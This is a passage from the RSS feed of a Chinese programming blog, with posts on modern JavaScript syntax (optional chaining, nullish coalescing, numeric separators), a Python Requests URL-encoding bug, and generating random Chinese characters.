&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;trimStart&lt;/span&gt;()) &lt;span style=&#34;color:#75715e&#34;&gt;// &amp;#39;林三心   &amp;#39;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 去除尾部空格
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;str&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;trimEnd&lt;/span&gt;()) &lt;span style=&#34;color:#75715e&#34;&gt;// &amp;#39;   林三心&amp;#39;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3-和-&#34;&gt;3.?? 和 ?.&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;?.&lt;/code&gt;中文名为可选链，可以使某些空变量，可以进行操作&lt;/p&gt;
&lt;p&gt;比如有一个对象，我要取一个可能不存在的值，甚至我们都不确定obj是否存在&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;obj&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
  &lt;span style=&#34;color:#a6e22e&#34;&gt;cat&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; {
    &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;哈哈&amp;#39;&lt;/span&gt;
  }
}
&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;dog&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;obj&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;obj&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;dog&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;obj&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;dog&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;// undefined
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;// 可选链
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;obj&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
  &lt;span style=&#34;color:#a6e22e&#34;&gt;cat&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; {
    &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;哈哈&amp;#39;&lt;/span&gt;
  }
}
&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;dog&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;obj&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;dog&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;// undefined
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;比如有一个数组，我不确定它存不存在，存在的话就取索引为1的值&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;// do something
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;item&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]

&lt;span style=&#34;color:#75715e&#34;&gt;// 可选链
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;// do something
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;item&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt;.[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;比如有一个函数，我们不确定它存不存在，存在的话就执行它&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fn&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;// do something
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fn&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fn&lt;/span&gt;()

&lt;span style=&#34;color:#75715e&#34;&gt;// 可选链
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fn&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;// do something
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fn&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt;.()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;??&lt;/code&gt;中文名为空位合并运算符，&lt;code&gt;??&lt;/code&gt;和&lt;code&gt;||&lt;/code&gt;最大的区别是，&lt;code&gt;??&lt;/code&gt;只有&lt;code&gt;undefined, null&lt;/code&gt;才算假值&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;// A
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;b&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;// A
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;// A
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;d&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;undefined&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;// A
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;// A
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;??&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;// 0
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;b&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;??&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;// &amp;#39;&amp;#39;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;c&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;??&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;// false
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;d&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;undefined&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;??&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;// A
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;??&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;// A
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;4数字分隔符&#34;&gt;4.数字分隔符&lt;/h2&gt;
&lt;p&gt;数字分隔符可以让你在定义长数字时，更加地一目了然&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1000000000&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;// 使用数字分隔符
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1_000_000_000&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>BUG—Request 模块 Url 编码异常</title>
        <link>https://ac-lm.github.io/posts/bug/bugrequest-%E6%A8%A1%E5%9D%97-url-%E7%BC%96%E7%A0%81%E5%BC%82%E5%B8%B8/</link>
        <pubDate>Thu, 16 Sep 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/bug/bugrequest-%E6%A8%A1%E5%9D%97-url-%E7%BC%96%E7%A0%81%E5%BC%82%E5%B8%B8/</guid>
        <description>&lt;h2 id=&#34;bug-描述&#34;&gt;BUG 描述&lt;/h2&gt;
&lt;p&gt;Python 中用户使用 Requests 库发送 Http 请求时，请求的所有参数都会被进行 Url 编码。此时容易出现由于 Url 编码后参数异常的情况，特别是&lt;strong&gt;中文字符&lt;/strong&gt;，最终导致 Http 请求失败。&lt;/p&gt;
&lt;h2 id=&#34;resolution&#34;&gt;Resolution&lt;/h2&gt;
&lt;p&gt;用户可以将参数提前进行编码传递，以避免 Requests 库对参数的编码&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;payload1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{ABC}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# String&lt;/span&gt;
data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; payload1&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;utf-8&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# b&amp;#39;{ABC}&amp;#39; 转换后的 UTF-8 编码&lt;/span&gt;
response &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;request(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;POST&amp;#34;&lt;/span&gt;, url, data&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;data)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;复现&#34;&gt;复现&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;def import_school():
    api = &#39;http://192.168.1.240/base/school&#39;
    school_name = [&#39;第一中学&#39;, &#39;第二中学&#39;, &#39;实验中学&#39;]
    jurisdiction = [&#39;荔湾区&#39;, &#39;越秀区&#39;, &#39;海珠区&#39;, &#39;天河区&#39;, &#39;白云区&#39;, &#39;黄埔区&#39;, &#39;番禺区&#39;, &#39;花都区&#39;, &#39;南沙区&#39;, &#39;从化区&#39;, &#39;增城区&#39;]
    county_number = [440103, 440104, 440105, 440106, 440111, 440112, 440113, 440114, 440115, 440117, 440118]
    print(len(jurisdiction))
    print(len(county_number))
    did = &amp;quot;440104002&amp;quot;
    area_id = 3
    data = {&amp;quot;name&amp;quot;: &amp;quot;越秀第二中学&amp;quot;,
            &amp;quot;is_famous&amp;quot;: 2,
            &amp;quot;school_number&amp;quot;: 440104,
            &amp;quot;principal&amp;quot;: &amp;quot;&amp;quot;,
            &amp;quot;telephone&amp;quot;: &amp;quot;&amp;quot;,
            &amp;quot;address&amp;quot;: &amp;quot;&amp;quot;,
            &amp;quot;email&amp;quot;: &amp;quot;&amp;quot;,
            &amp;quot;logo_url&amp;quot;: &amp;quot;&amp;quot;,
            &amp;quot;icon_url&amp;quot;: &amp;quot;&amp;quot;,
            &amp;quot;official_website&amp;quot;: &amp;quot;&amp;quot;,
            &amp;quot;org_web_path&amp;quot;: did,
            &amp;quot;area_id&amp;quot;: area_id,
            &amp;quot;user_name&amp;quot;: did,
            &amp;quot;account&amp;quot;: did,
            &amp;quot;password&amp;quot;: &amp;quot;7c4a8d09ca3762af61e59520943dc26494f8941b&amp;quot;}
    response = requests.request(&amp;quot;POST&amp;quot;, api, data=data, headers=headers).json()
    print(response)


if __name__ == &amp;quot;__main__&amp;quot;:
    import_school()
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;运行&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{&#39;info&#39;: {&#39;message&#39;: &#39;非法参数&#39;, &#39;detail&#39;: &amp;quot;invalid character &#39;a&#39; in literal null (expecting &#39;u&#39;)&amp;quot;}, &#39;status&#39;: 10002}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;调试，检查response，找到request体，查看body参数内容&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;name=%E8%B6%8A%E7%A7%80%E7%AC%AC%E4%BA%8C%E4%B8%AD%E5%AD%A6&amp;amp;is_famous=2&amp;amp;school_number=440104&amp;amp;principal=&amp;amp;telephone=&amp;amp;address=&amp;amp;email=&amp;amp;logo_url=&amp;amp;icon_url=&amp;amp;official_website=&amp;amp;org_web_path=440104002&amp;amp;area_id=3&amp;amp;user_name=440104002&amp;amp;account=440104002&amp;amp;password=7c4a8d09ca3762af61e59520943dc26494f8941b
&lt;/code&gt;&lt;/pre&gt;</description>
        </item>
        <item>
        <title>Python—随机生成中文字符名字</title>
        <link>https://ac-lm.github.io/posts/python/python%E9%9A%8F%E6%9C%BA%E7%94%9F%E6%88%90%E4%B8%AD%E6%96%87%E5%AD%97%E7%AC%A6%E5%90%8D%E5%AD%97/</link>
        <pubDate>Thu, 16 Sep 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/python/python%E9%9A%8F%E6%9C%BA%E7%94%9F%E6%88%90%E4%B8%AD%E6%96%87%E5%AD%97%E7%AC%A6%E5%90%8D%E5%AD%97/</guid>
        <description>&lt;h2 id=&#34;一如何生成中文字符&#34;&gt;一.如何生成中文字符&lt;/h2&gt;
&lt;h3 id=&#34;1unicode-编码&#34;&gt;1.Unicode 编码&lt;/h3&gt;
&lt;p&gt;在 Unicode 编码中，汉字的范围是（ 0x4E00，9FBF），因此我们可以从中取值生成中文字符。需要注意的是，Unicode 编码中收录了 2 万多个汉字，其中包含很多生僻的繁体字。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; random

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Unicode&lt;/span&gt;():
    val &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; random&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;randint(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x4e00&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9fbf&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; chr(val)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;2gbk2312&#34;&gt;2.GBK2312&lt;/h3&gt;
&lt;p&gt;GBK2312 对字符的编码采用的是两个字节相组合，中文字符第一个字节的范围是（ 0xB0-0xF7 ），第二个字节的范围是（ 0xA1- 0xFE），GBK2312 收录了 6 千多常用汉字。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; random

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;GBK2312&lt;/span&gt;():
    head &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; random&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;randint(&lt;span style=&#34;color:#ae81ff&#34;&gt;0xb0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xf7&lt;/span&gt;)
    body &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; random&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;randint(&lt;span style=&#34;color:#ae81ff&#34;&gt;0xa1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xf9&lt;/span&gt;)   &lt;span style=&#34;color:#75715e&#34;&gt;# 在head区号为55的那一块最后5个汉字是乱码,为了方便缩减下范围&lt;/span&gt;
    val &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;head&lt;span style=&#34;color:#e6db74&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}{&lt;/span&gt;body&lt;span style=&#34;color:#e6db74&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
    str &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bytes&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fromhex(val)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;gb2312&amp;#39;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; str
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;3自行生成字典&#34;&gt;3.自行生成字典&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;second_name&lt;/span&gt;():  &lt;span style=&#34;color:#75715e&#34;&gt;# 随机取名字典&lt;/span&gt;
    second_name_list &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
